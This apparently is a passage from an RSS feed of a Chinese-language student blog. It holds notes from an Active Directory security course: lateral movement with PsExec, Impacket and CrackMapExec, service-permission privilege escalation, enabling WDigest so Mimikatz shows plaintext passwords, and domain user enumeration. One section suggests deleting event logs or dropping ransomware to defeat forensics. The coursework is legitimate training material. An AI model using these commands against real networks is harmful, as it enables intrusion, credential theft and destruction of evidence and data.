終端使用者授權合約（英語：end-user license agreements，英文縮寫：EULA）是指軟體的開發者或發行者授權使用者使用特定軟體產品時的規定，大多私有軟體附帶此合約，如不接受則無法安裝。不過自由軟體則較少使用這個合約
Lab 此Lab主要是要讓我們可以遠端執行其他人的電腦，當我們已經取得local admin時，但domain admin遲遲沒有出現，我們就需要多找幾台主機試看看，可不可以登入或是遠端連線，這樣從一台主機出發，多幾台主機一起蹲domain admin的機會就會變大，可能會有疑問，要怎麼知道其他電腦的密碼呢?如果這一間公司它沒有使用之前介紹過的LAPS密碼管理工具，而且又是委外管理，則很有可能會有多台主機的密碼都一樣，然後再用前面提到的多種密碼提取方法(Brute Force SAM/Password Spraying etc)，得到更多台主機的密碼，然後再利用Mimikatz之類的工具把lsass的info leak出來，就有可能得到domain admin的密碼
==遠端執行(RDP)== Linux / Kali Tools xfreerdp $ sudo apt install freerdp2-x11 -y Libfreerdp 先到https://packages.debian.org/sid/libfreerdp-client2-2這個頁面看一下要下載哪一個版本，Kali是amd64 $ cd ~/Downloads $ wget http://ftp.tw.debian.org/debian/pool/main/f/freerdp2/libfreerdp-client2-2_2.10.0+dfsg1-1.1_amd64.deb Windows Tools: Psexec.exe 微軟的遠端執行工具，具有微軟的簽章，第一次使用需要接受EULA $ PsExec.exe -i \\&lt;Remote IP> -accepteula -u [&lt;domain>]\&lt;Remote Username> -p &lt;Remote Password> cmd ==How to use xfreerdp== 網路上有很多文章和教學12，不過他們的情況和我們的狀況有點不一樣 :::success 使用條件：Win2016一定要打開，事先取得帳號的密碼 :::</description></item><item><title>NTUSTISC - AD Note - Lab(遠端執行(RDP)2)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x23%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8Crdp2/index.html</guid><description>NTUSTISC - AD Note - Lab(遠端執行(RDP)2) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background NTUSTISC - AD Note - Lab(Password Spraying) 滲透測試的利器 - Impacket:
python撰寫的內網滲透工具
Lab ==遠端執行(RDP)2== Kali-Linux Tools Impacket(Kali-Linux愛好者可使用的PsExec) # Set up &amp; Install $ git clone https://github.com/fortra/impacket.git $ cd impacket $ conda activate py3.7 # Recommended to install it in conda $ pip3 install -r requirements.txt $ python3 setup.py install # Cheat-Sheet $ conda activate py3.7 $ proxychains psexec.py &lt;username>:&lt;password>@&lt;ip> whoami CrackMapExec $ crackmapexec smb [IP] -u &lt;username> -p &lt;password --exec-method smbexec -x '&lt;command>' exec-method支援以下方法: * mmcexec * smbexec * wmiexec * atexec ==How to use Impacket== 感覺應該是proxychains壞掉了，或是有一些其他問題，導致Connection Refused，總而言之，這套工具就是讓kali-linux也可以使用psexec這個工具</description></item><item><title>NTUSTISC - AD Note - Lab(錯誤配置)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x12%E9%8C%AF%E8%AA%A4%E9%85%8D%E7%BD%AE/index.html</guid><description>NTUSTISC - AD Note - Lab(錯誤配置) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Guess Password 管理服務 錯誤配置 服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的 透過accesschk.exe找出有問題的地方 $ accesschk.exe &lt;user> &lt;path> For example $ accesschk.exe "Administrator" "C:\Program Files\" Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\Program Files Lab Time - 本地提權 ==錯誤配置== 找出low有存取權限的service檔案
$ accesschk.exe "low" "C:\tools" Accesschk v6.15 - Reports effective permissions for securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com RW C:\tools\AccessChk RW C:\tools\accesschk.exe RW C:\tools\AccessChk.zip RW C:\tools\BloodHound-master RW C:\tools\BloodHound-win32-x64 RW C:\tools\BloodHound-win32-x64-4.0.3.zip RW C:\tools\BloodHound-win32-x64-4.1.0 RW C:\tools\BloodHound-win32-x64-4.1.0.zip RW C:\tools\Certify.exe RW C:\tools\DNSAdmin-DLL.dll RW C:\tools\KDU-1.1.0 RW C:\tools\KmdManager.exe RW C:\tools\mimikatz_trunk RW C:\tools\neo4j-community-4.3.4 RW C:\tools\neo4j-community-4.3.4-windows.zip RW C:\tools\nopad RW C:\tools\openssl.zip RW C:\tools\PrintSpoofer64.exe RW C:\tools\Procdump RW C:\tools\ProcessExplorer RW C:\tools\PSTools RW C:\tools\Rubeus.exe RW C:\tools\Windows-Kernel-Explorer-master</description></item><item><title>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/index.html</guid><description>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼
What is WDigest WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證
什麼是安全性識別碼？
安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。
每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。
Lab ==顯示Mimikatz的明文== 只要打開regedit，在電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest可能會看到UseLogonCredential的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增 重開機 重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看
Result 我挑了幾個SID一樣的結果來看 左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來</description></item><item><title>NTUSTISC - AD Note - 會後提及有用的工具</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---%E6%9C%83%E5%BE%8C%E6%8F%90%E5%8F%8A%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/index.html</guid><description>NTUSTISC - AD Note - 會後提及有用的工具 [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background EDR(Endpoint Detection and Response) 端點偵測及回應 (EDR) 結合了即時的持續監控、端點資料蒐集，以及進階交叉關聯，來偵測並回應主機和端點連線的可疑活動。這套方法可讓資安團隊快速發掘並交叉分析各種活動來產生高可信度的偵測事件，並提供手動和自動化回應選項。
EDR 解決方案會記錄端點上發生的所有活動和事件。某些廠商或許還會將這項服務延伸至任何與您網路相連的工作負載。然後，這些記錄 (或事件記錄檔) 可用來發掘原本不會被發現的資安事件。即時的監控可以更快偵測威脅，不讓威脅有機會擴散至使用者端點之外。
其實就是把我們感興趣的log抓出來而已
XDR(Extended detection and response) XDR (延伸式偵測及回應) 可蒐集並自動交叉關聯涵蓋多個防護層的資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此可藉由資安分析來提供更快的威脅偵測，提升調查與回應時間。
XDR 能打破資安產品之間的藩籬，採用一種全方位面面俱到的偵測及回應方法。XDR 可蒐集並透過交叉關聯涵蓋多個防護層的偵測事件與深入的活動資料，包括：電子郵件、端點、伺服器、雲端工作負載以及網路。如此豐富的資料若能透過自動化分析，就能更快偵測威脅，同時也讓資安分析師擁有適當的工具可完成更多任務，並透過調查來採取更迅速的行動。 簡單來說EDR只能特定範圍或是單一產品上做到端點偵測，但XDR是能夠跨各個資安產品或是layer達到更全面的偵測以及比對事件的結果
MDR(Managed Detection and Response) 提供專業的資安人員來協助企業進行監控網路、分析事件、並且回應所遭遇的資安狀況如何做出對應的應變
是一種服務 藉由資安專家的服務，提供及時、有效的處理，以避免損失擴大 將安全專業知識外包給專業的人員 分析警示當中潛藏的危險徵兆 如何滅證 只要讓windows保持預設值或是把event file砍掉就好了，因為windows10會記錄很多使用者的狀況，例如Quick Access的使用路徑或是使用者之前使用過的應用程式的縮圖等等，所以最暴力的方式是離開之前丟一個勒索病毒，它就會針對常見的file進行加密，這樣縱使不把東西刪掉，鑑識人員也不會知道裡面的內容是甚麼
如果正在使用Win2008/2012 請趕快升級成Win2016，因為有很多攻擊手段是到win2016的就失效的，例如前面提到的wdigest在2008/2012是會開的，因為這樣在認證上才會成功
什麼是誘捕系統（Honey Pot）？ 就像是一罐用來吸引、捕捉昆蟲的蜂蜜，所謂的誘捕系統（Honey Pot）就是一個吸引攻擊者的目標，透過誘捕的手法，吸引駭客發動攻擊，以蒐集攻擊者的來源以及攻擊手法，現在除了應用在蒐集病毒特徵、攻擊手法，也用來蒐集假網站的IP，以及散布木馬或間諜程式等惡意來源名單，藉此觀察病蠕蟲、駭客入侵或惡意攻擊的來源、手段、管道及模式，由於會將所有攻擊動作與過程記錄下來，已經成為蒐集駭客資訊的重要方式之ㄧ。
此外，誘捕系統還具有消耗攻擊時間、轉移攻擊目標等的功能。一個「接近真實」的誘補系統必須定期更新與維護，才能與駭客互動、吸引駭客長時間注意，除了提供詳盡的攻擊細節，研究人員必須觀察攻擊者的動機，並擬定因應對策，而系統也必須定期清除所遭受到的感染。
什麼是SCCM? Microsoft System Center Configuration Manager</description></item><item><title>NTUSTISC - AD Note - 環境建置 &amp; Background</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/ntustisc---ad-note---0x01%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE--background/index.html</guid><description>NTUSTISC - AD Note - 環境建置 &amp; Background [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background What is Directory Service?1
Windows Server 系統使用的目錄服務 就是 Active Directory
What is Active Directory(AD)?2
Windows的Windows Server中，負責架構中大型網路環境的集中式目錄管理服務(Directory Services)，他處理在組織中的網路物件，物件可以是使用者、群組、電腦、網域控制站、郵件、設定檔、組織單元、樹系等等，只要是在AD結構定義檔(Schema)中定義的物件，就可以儲存在AD資料檔中，並利用AD Service Interface來存取
What is Domain Service?1
執行 AD DS 的伺服器稱為 domain controllers (DCs)</description></item><item><title>NTUSTISC - AD Note(Lab - 查詢網域使用者)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x03%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E4%BD%BF%E7%94%A8%E8%80%85/index.html</guid><description>NTUSTISC - AD Note(Lab - 查詢網域使用者) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==查詢網域使用者== 常用的cheat sheet
$ net user /domain $ net user &lt;username> /domain :::spoiler Implementation
$ net user /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\WIN-818G5VCOLJO.kuma.org 的使用者帳戶 ------------------------------------------------------------------------------- Administrator aleda.appolonia alikee.perri aloise.elfrida amabelle.gayle andree.suki angelique.hilda annice.eden anya.gypsy audi.rosalind babb.joanne bambi.etta bear berget.celka berna.raphaela berny.kirby bill.marylee caitrin.latia carey.kincaid carlye.chloette carmelle.libbi casandra.cherrita casi.hyacinth cassondra.lothario celeste.kelci charis.kory christi.nettle coraline.mahalia corine.celesta cyndie.rhodie daile.odetta darlleen.dorisa DefaultAccount dollie.fayina dominica.carmon dorrie.paolina eba.luca ella.randee erena.elinore fara.iseabal fred.carmita gabriel.diannne garnet.constancia gertrude.felecia gillian.marsiella giulietta.moyra glenda.dorrie Guest henrieta.sabine herminia.debby issy.eudora jerrie.morganne jessa.corinna jori.floria joyann.sibella kaja.brenda karoly.nadeen katee.annemarie katharina.alyssa kiri.kath kizzee.margaux krbtgt laurena.mirelle lazaro.karoly lilas.lindy lily.kristofor lina.allene linda.neda logan.janeen lon.sonni lorne.celie lucilia.lelah margo.sharl marlyn.loralee marney.ranee martita.juanita marylynne.susannah maurizia.ines mercy.edi moyra.fanechka nolana.rivy ollie.dorita orelee.peri ortensia.fancy philippa.eugenie philis.gilli pietra.fern randene.lelah ranee.delinda reina.claire renae.babette reyna.gwendolyn ricca.stefa ronni.kristoforo rosetta.lotta ruthann.britta ruthie.ebony seana.jeanette selestina.cassi shantee.marylin sherri.jacquetta sile.rhiamon sofie.darlleen star.rikki stormie.natala 命令已經成功完成。 ::: 說明：如果目前登入的帳號是在domain底下，就會出現類似如上的結果，會有一大堆使用者，但是目前的帳號沒有在該domain底下，會出現以下error:</description></item></channel></rss>